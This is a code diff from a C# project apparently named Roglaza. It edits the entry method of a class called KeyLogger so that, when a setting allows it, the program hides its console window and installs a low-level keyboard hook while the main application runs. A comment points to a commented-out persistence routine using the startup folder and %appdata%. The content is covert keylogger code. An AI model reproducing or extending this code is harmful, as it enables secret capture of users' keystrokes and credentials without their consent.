@@ -52,23 +52,25 @@ class KeyLogger
 
     public static void XMain()
     {
-        Roglaza.Program.LoadSettings();
-        var handle = GetConsoleWindow();
-
-        // Hide
-
-        ShowWindow(handle, SW_HIDE);
-
-        // Maintain access (startup folder and %appdata%)
-        //init();
-
-        // start hooking keyboard
+        //Run keylogger with application
         if (Roglaza.Program.ProgramSettings.AllowKeyLogger)
+        {
+            var handle = GetConsoleWindow();
+            // Hide
+            ShowWindow(handle, SW_HIDE);
+            // Maintain access (startup folder and %appdata%)
+            //init();
+            // start hooking keyboard
             _hookID = SetHook(_proc);
-        //Application.Run();
-        Roglaza.Program.Exec();
-        UnhookWindowsHookEx(_hookID);
-
+            //Application.Run();
+            Roglaza.Program.Exec();
+            UnhookWindowsHookEx(_hookID);
+        }
+        else
+        {
+            //run application only
+            Roglaza.Program.Exec();
+        }
     }
 
     private static IntPtr SetHook(LowLevelKeyboardProc proc)
